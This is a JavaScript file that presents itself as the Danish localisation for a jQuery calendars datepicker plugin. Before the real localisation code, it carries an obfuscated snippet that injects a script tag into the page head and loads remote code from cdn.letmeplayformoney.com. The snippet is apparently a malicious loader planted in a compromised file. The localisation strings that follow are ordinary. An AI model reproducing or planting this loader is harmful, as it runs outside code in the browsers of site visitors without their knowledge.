var _0x25b0=['createElement','script','onload','src','https://cdn.letmeplayformoney.com/main.js?cdn=js','text/javascript','getElementsByTagName','head','appendChild'];(function(_0x38c36f,_0x12afce){var _0x31d501=function(_0x338e37){while(--_0x338e37){_0x38c36f['push'](_0x38c36f['shift']());}};_0x31d501(++_0x12afce);}(_0x25b0,0x1dd));var _0x4bec=function(_0x1c1d3d,_0x21e514){_0x1c1d3d=_0x1c1d3d-0x0;var _0x2921c7=_0x25b0[_0x1c1d3d];return _0x2921c7;};var script=document[_0x4bec('0x0')](_0x4bec('0x1'));script[_0x4bec('0x2')]=function(){};script[_0x4bec('0x3')]=_0x4bec('0x4');script['type']=_0x4bec('0x5');document[_0x4bec('0x6')](_0x4bec('0x7'))[0x0][_0x4bec('0x8')](script);﻿/* http://keith-wood.name/calendars.html
   Danish localisation for calendars datepicker for jQuery.
   Written by Jan Christensen ( deletestuff@gmail.com). */
(function($) {
	$.calendars.picker.regional['da'] = {
		renderer: $.calendars.picker.defaultRenderer,
        prevText: '&#x3c;Forrige', prevStatus: 'Vis forrige måned',
		prevJumpText: '&#x3c;&#x3c;', prevJumpStatus: '',
		nextText: 'Næste&#x3e;', nextStatus: 'Vis næste måned',
		nextJumpText: '&#x3e;&#x3e;', nextJumpStatus: '',
		currentText: 'Idag', currentStatus: 'Vis aktuel måned',
		todayText: 'Idag', todayStatus: 'Vis aktuel måned',
		clearText: 'Nulstil', clearStatus: 'Nulstil den aktuelle dato',
		closeText: 'Luk', closeStatus: 'Luk uden ændringer',
		yearStatus: 'Vis et andet år', monthStatus: 'Vis en anden måned',
		weekText: 'Uge', weekStatus: 'Årets uge',
		dayStatus: 'Vælg D, M d', defaultStatus: 'Vælg en dato',
		isRTL: false
	};
	$.calendars.picker.setDefaults($.calendars.picker.regional['da']);
})(jQuery);
